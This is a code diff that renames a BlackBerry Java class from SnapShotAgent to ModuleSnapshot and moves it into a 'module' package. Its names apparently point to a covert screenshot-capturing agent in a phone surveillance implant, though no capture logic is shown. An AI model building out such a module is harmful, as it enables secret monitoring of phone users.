@@ -7,7 +7,7 @@
  * File         : SnapShotAgent.java
  * Created      : 28-apr-2010
  * *************************************************/
-package blackberry.agent;
+package blackberry.module;
 
 import java.io.EOFException;
 
@@ -31,7 +31,7 @@ import blackberry.utils.WChar;
  * 
  * @author user1
  */
-public final class SnapShotAgent extends Module implements UserAgent{
+public final class ModuleSnapshot extends BaseModule implements UserAgent{
     //#ifdef DEBUG
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
     //#endif
@@ -50,8 +50,8 @@ public final class SnapShotAgent extends Module implements UserAgent{
      * @param agentStatus
      *            the agent status
      */
-    public SnapShotAgent(final boolean agentEnabled) {
-        super(Module.AGENT_SNAPSHOT, agentEnabled, Conf.AGENT_SNAPSHOT_ON_SD,
+    public ModuleSnapshot(final boolean agentEnabled) {
+        super(BaseModule.AGENT_SNAPSHOT, agentEnabled, Conf.AGENT_SNAPSHOT_ON_SD,
                 "SnapShotAgent");
         //#ifdef DBC
         Check.asserts(
@@ -68,7 +68,7 @@ public final class SnapShotAgent extends Module implements UserAgent{
      * @param confParams
      *            the conf params
      */
-    protected SnapShotAgent(final boolean agentStatus, final byte[] confParams) {
+    protected ModuleSnapshot(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
